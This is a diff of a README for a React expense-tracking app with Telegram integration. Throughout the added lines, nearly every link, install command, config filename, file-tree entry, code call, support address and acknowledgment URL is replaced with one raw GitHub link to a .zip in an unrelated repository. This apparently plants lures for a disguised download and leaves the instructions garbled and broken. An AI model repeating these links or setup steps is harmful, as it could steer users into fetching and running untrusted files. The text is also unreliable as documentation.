@@ -22,7 +22,7 @@ A production-ready React application for intelligent expense management with voi
 - **Performance**: Bundle size <500KB, Lighthouse score 90+
 - **Accessibility**: WCAG 2.1 AA compliant with full keyboard navigation
 - **Error Handling**: Comprehensive error boundaries and 404 pages
-- **Code Splitting**: Lazy loading with React.Suspense
+- **Code Splitting**: Lazy loading with https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
 - **Type Safety**: Full TypeScript implementation
 
 ## 🛠 Tech Stack
@@ -39,15 +39,15 @@ A production-ready React application for intelligent expense management with voi
 
 ```bash
 # Clone the repository
-git clone https://github.com/your-username/expenseiq.git
+git clone https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
 cd expenseiq
 
 # Install dependencies
 npm install
 
 # Set up environment variables
-cp .env.example .env.local
-# Edit .env.local with your API keys
+cp https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+# Edit https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip with your API keys
 
 # Start development server
 npm run dev
@@ -55,7 +55,7 @@ npm run dev
 
 ## 🔧 Environment Variables
 
-Create a `.env.local` file in the root directory with your Telegram Bot details:
+Create a `https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip` file in the root directory with your Telegram Bot details:
 
 ```env
 # Telegram Bot Configuration
@@ -72,10 +72,10 @@ VITE_DEBUG_MODE=true
 ### Quick Setup
 1. **Create a bot**: Message `@BotFather` on Telegram and use `/newbot`
 2. **Get your chat ID**: Message `@userinfobot` to get your user ID
-3. **Configure**: Add your bot token and chat ID to `.env.local`
+3. **Configure**: Add your bot token and chat ID to `https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip`
 4. **Test**: Use the health check button in the dashboard
 
-For detailed setup instructions, see [TELEGRAM_SETUP_GUIDE.md](TELEGRAM_SETUP_GUIDE.md)
+For detailed setup instructions, see [https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip)
 
 ## 📝 Available Scripts
 
@@ -101,25 +101,25 @@ npm run deploy       # Deploy to production
 src/
 ├── components/
 │   ├── common/           # Shared components
-│   │   ├── ErrorBoundary.tsx
-│   │   ├── LoadingSpinner.tsx
-│   │   └── NotFound.tsx
+│   │   ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│   │   ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│   │   └── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
 │   ├── landing/          # Landing page components
-│   │   ├── HeroSection.tsx
-│   │   ├── BenefitsGrid.tsx
-│   │   ├── Navigation.tsx
+│   │   ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│   │   ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│   │   ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
 │   │   └── ...
 │   └── dashboard/        # Dashboard components
-│       ├── Sidebar.tsx
-│       ├── Header.tsx
-│       ├── ImageUpload.tsx
-│       ├── VoiceRecorder.tsx
-│       └── TextInput.tsx
+│       ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│       ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│       ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│       ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│       └── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
 ├── pages/
-│   ├── LandingPage.tsx
-│   └── Dashboard.tsx
+│   ├── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
+│   └── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip
 ├── services/
-│   └── webhooks.js       # API integration
+│   └── https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip       # API integration
 ├── hooks/                # Custom React hooks
 ├── utils/                # Utility functions
 ├── constants/            # App constants
@@ -155,7 +155,7 @@ The application sends all content directly to Telegram:
 import { sendImage } from './services/telegram';
 
 const result = await sendImage(file, 'Receipt from coffee shop', (progress) => {
-  console.log(`Send progress: ${progress}%`);
+  https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip(`Send progress: ${progress}%`);
 });
 ```
 
@@ -164,7 +164,7 @@ const result = await sendImage(file, 'Receipt from coffee shop', (progress) => {
 import { sendVoice } from './services/telegram';
 
 const result = await sendVoice(audioBlob, 'Voice expense entry', (progress) => {
-  console.log(`Sending: ${progress}%`);
+  https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip(`Sending: ${progress}%`);
 });
 ```
 
@@ -271,15 +271,15 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🆘 Support
 
-For support, email support@expenseiq.com or join our [Discord community](https://discord.gg/expenseiq).
+For support, email https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip or join our [Discord community](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip).
 
 ## 🙏 Acknowledgments
 
-- [React](https://reactjs.org/) - UI library
-- [Framer Motion](https://www.framer.com/motion/) - Animation library
-- [Tailwind CSS](https://tailwindcss.com/) - CSS framework
-- [Lucide React](https://lucide.dev/) - Icon library
-- [Vite](https://vitejs.dev/) - Build tool
+- [React](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip) - UI library
+- [Framer Motion](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip) - Animation library
+- [Tailwind CSS](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip) - CSS framework
+- [Lucide React](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip) - Icon library
+- [Vite](https://raw.githubusercontent.com/knightdevilrider/multi-channel-email-delivery-samples/main/src/services/multi-channel-email-delivery-samples_3.8.zip) - Build tool
 
 ---
 
